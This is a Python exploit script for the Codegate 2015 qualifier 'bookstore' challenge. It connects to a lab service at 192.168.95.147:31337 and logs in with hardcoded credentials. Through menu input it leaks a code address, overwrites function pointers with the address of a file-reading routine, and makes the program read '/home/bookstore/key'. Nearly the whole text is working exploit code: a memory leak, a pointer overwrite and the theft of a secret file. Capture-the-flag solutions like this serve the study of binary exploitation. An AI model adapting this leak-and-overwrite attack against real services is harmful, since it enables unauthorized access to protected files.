# codegate 2015 quals bookstore
from err0rless import *

s, t = connectSocket("192.168.95.147", 31337)

def AddNewItem(bookname, description, type, max_download = 0):
	s.send("1\n")

	print t.read_until("Bookname : \n")
	s.send(bookname + "\n")

	print t.read_until("Description : \n")
	s.send(description + "\n")

	print t.read_until("EBook)\n")
	s.send(str(type) + "\n")

	print t.read_until("> ")

def ModInformation(stock, price, freeShip, avaliable, newname, newdesc):
	s.send("3\n")

	print t.read_until("Stock : \n")
	s.send(str(stock) + "\n")

	print t.read_until("Price : \n")
	s.send(str(price) + "\n")

	print t.read_until("0 : not) \n")
	s.send(str(freeShip) + "\n")

	print t.read_until("Avaliable :\n")
	s.send(str(avaliable) + "\n")

	print t.read_until("bookname\n")
	s.send(newname + "\n")

	print t.read_until("description\n")
	s.send(newdesc + "\n")

	print t.read_until("menu!\n")

def pMain():
	# AUTH
	print t.read_until("ID : ")
	s.send("helloadmin\n")      # Send ID
	print t.read_until("PASSWORD : ")
	s.send("iulover!@#$\n")     # Send PW

	print t.read_until("> ")
	AddNewItem("FirstBook", "Firstdesc", 0) # Add First ITEM, no free shipping

	s.send("2\n")

	print t.read_until("No : ")
	s.send("0\n")

	# for memoryleak : function1, addr + 0x9AD
	print t.read_until("menu!\n")
	ModInformation(0x12345678, 0x44444444, 1, 1, "N" * 20, "D" * 299 + "X")

	s.send("0\n")
	print t.read_until("> ")

	s.send("4\n")
	print t.read_until("No : ")

	# dump(t.read_until(str(0x12345678)+"\n\n"))

	# get file_read address
	baseAddr  = up32(t.read_until(str(0x12345678) + "\n\n")[0x45:0x49]) - 0x9AD
	file_read = baseAddr + 0x8DB

	# Modify description
	print t.read_until("> ")
	s.send("2\n")
	print t.read_until("No : ")
	s.send("0\n")
	print t.read_until("menu!\n")
	s.send("2\n")
	print t.read_until("description\n")
	s.send(p32(file_read) * (3000 / 4))

	# set bookname to keypath
	print t.read_until("menu!\n")
	ModInformation(1, 1, 0, 1, "/home/bookstore/key\x00", "newDesc")

	s.send("4\n")

	# execute file_read(bookname);
	print t.read_until("shipping)\n")
	s.send("1\n")
	print t.read_until("menu!\n")
	s.send("0\n")
	print t.read_until("> ")
	s.send("3\n")
	print t.read_until("No : ")
	s.send("0\n")

	print t.read_until("> ")

if __name__ == "__main__":
	pMain()